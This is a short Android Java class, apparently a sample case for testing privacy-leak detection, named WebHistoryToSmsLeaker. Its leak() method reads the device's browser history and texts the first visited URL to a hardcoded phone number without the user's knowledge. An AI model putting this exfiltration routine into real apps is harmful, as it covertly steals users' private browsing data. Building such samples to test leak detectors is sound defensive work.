package SampleApp.src.com.example.sampleapp;

import android.content.ContentResolver;
import android.database.Cursor;
import android.util.Log;

public class WebHistoryToSmsLeaker extends Leaker {

	private ContentResolver mResolver;
	
	public WebHistoryToSmsLeaker(ContentResolver resolver) {
		mResolver = resolver;
	}
	
	@Override
	final public void leak() {
    	// Get web history data
    	String url = "";

    	Cursor urlCursor = android.provider.Browser.getAllVisitedUrls(mResolver);
    	
    	if (urlCursor != null && urlCursor.moveToNext()) {
    		int urlIndex = urlCursor.getColumnIndex(android.provider.Browser.BookmarkColumns.URL);
    		url = urlCursor.getString(urlIndex);
    		Log.i("leakToSMSDirectly", url);
    	}
    	
    	// Add url to text message and send
    	android.telephony.SmsManager smsManager = android.telephony.SmsManager.getDefault();
    	smsManager.sendTextMessage("+14161234567", null, url, null, null);
	}
}
